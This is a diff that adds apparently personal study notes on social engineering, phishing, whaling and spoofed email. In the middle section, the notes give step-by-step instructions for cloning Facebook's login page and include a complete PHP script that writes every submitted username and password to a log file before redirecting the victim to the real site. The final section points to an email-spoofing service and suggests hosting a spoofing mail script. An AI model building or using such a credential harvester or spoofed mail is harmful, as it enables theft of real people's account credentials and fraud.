@@ -1,0 +1,114 @@
+
+#---------------------------------------------------Social Engineering-------------------------------------------------#
+
+SOCIAL ENGINEERING
+==================
+Social Engineering is a term usually called for “Hacking done via Human Minds”.
+This is an art of Manipulating human minds so that they can split out the Confidential Information. These types of Information can be any Personal or Financial Information. This attack can only be possible through “Human Stupidity”.
+Phishing is a sub-category of Social Engineering.
+This step plays a very crucial role in Information gathering as you can acquire information from the victim which will later help an attacker to form a dictionary from the victim's interest and apply a brute force on places.
+
+
+Example: 	https://www.youtube.com/watch?v=F78UdORll-Q&ab_channel=LexihutProfessionalAdvisoryPlatform
+To gain more knowledge one can follow KEVIN MITTNICK .
+
+
+#-----------------------------------------------####------------------------------------------------#
+
+
+Phishing Attack:-
+-------------------------
+An attack where attacker forms a fake page of a genuine website which seems ok or legit to a victim and enters the credentials such as user name , password , phone no. etc.
+
+Link:- https://www.youtube.com/watch?v=BnmneAjVrM4
+            https://www.youtube.com/watch?v=WG8V1_Sj5g0
+
+There are basically two types of phishing .
+    1. Spear Phishing
+    2. Vector Phishing | Credential Harvestor
+
+1. Spear Phishing
+-----------------
+  Targeting a single or an individual or the crowd of people having common interest. Target Specific.
+
+Link:- https://www.youtube.com/watch?v=XsOWczwRVuc
+           https://www.youtube.com/watch?v=fZc2oXfz9Qs
+
+2. Credential Harvestor
+-----------------------
+  It is not target specific. Any kind of person can come and enter their credentials. I just need to collect the credentials of the crowd for my own purpose.
+
+Link:- https://www.youtube.com/watch?v=9TRR6lHviQc
+
+
+#-----------------------------------------------####------------------------------------------------#
+
+
+CREATION OF A PHISHING WEBPAGE
+===============================
+Workflow:
+= Opening any Social Networking Website and copy its Source Code - The Scripting Code of the Web Page.
+= Creating a PHP Page for getting the Data from the Phishing Page.
+= A text file to store the data of the Phishing page.
+
+
+Steps :
+=======
+1. Open Your Browser
+2. Goto www.facebook.com (or any other website through which you want to attack a victim)
+3. Right Click on the login page ---> view page source [Ctrl+U]
+4. Select all ---> copy
+5. Open notepad and paste the whole code
+6. Scroll to the very top of the code.
+7. Ctrl+F ---> action=
+  action="https://www.facebook.com/login.php?login_attempt=1&amp;lwv=110"
+8. In the received parameter
+  https://www.facebook.com/login.php?login_attempt=1&amp;lwv=110
+  Replace it with "anyname.php" 
+
+
+* Note : the name you redirect your phishing page will be same as the php code which will be receiving it as on pressing the action button the button will be rediricting you to a page that will perform the task of storing the credentials entered.
+
+Creation of anymane.php
+=====================
+<?php        //starting of a php code
+header ('Location: https://www.facebook.com');        //redirection to the original webpage 
+$handle = fopen("log.txt", "a");        //Creating a text file log.txt to store data & append it
+foreach($_POST as $variable => $value) {            //running of a loop until  we didn’t get the value
+   fwrite($handle, $variable);        //Writing the Variable Name
+   fwrite($handle, "=");        //To define the value of Equals to.
+   fwrite($handle, $value);        //For writing the Username of the data
+   fwrite($handle, "\r\n");        //For creating a New Line and Returning the value
+}        // end of loop
+fwrite($handle, "\r\n");        //For creating a New Line and Returning the value
+fclose($handle);        //saving and closing the file named log.txt
+exit;        // Exiting the PHP code
+?>        // End of the PHP Code
+
+
+#-----------------------------------------------####------------------------------------------------#
+
+
+Whaling:-
+---------------
+A whaling attack is a method used by cybercriminals to masquerade as a senior player at an organization and directly target senior or other important individuals at an organization, with the aim of stealing money or sensitive information or gaining access to their computer systems for criminal purposes.
+
+#------------------------OR--------------------------#
+
+A whaling attack is essentially a spear-phishing attack but the targets are bigger – hence whale phishing. Where spear-phishing attacks may target any individual, whaling attacks are more specific in what type of person they target: focusing on one specific high level executive or influencer vs a broader group of potential victims.
+
+Cybercriminals use whaling attacks to impersonate senior management in an organization, such as the CEO, CFO, or other executives, hoping to leverage their authority to gain access to sensitive data or money. They use the intelligence they find on the internet (and often social media) to trick employees – or another whale – into replying with financial or personal data.
+
+Link:- https://www.youtube.com/watch?v=JzoJeJBdhuI
+
+
+#-----------------------------------------------####------------------------------------------------#
+
+
+Fake Emails
+=========
+A fake email means a email generated by fake dummy server from which a attacker can generate there email and customize it to lure and attracts a Victim for Spear Phishing and other activities.
+
+Website - https://emkei.cz/
+
+Note: One could create a fake mailing script in php and could upload it in a free webhosting service which will help them to send fake mails and through which one can spoof anyone.
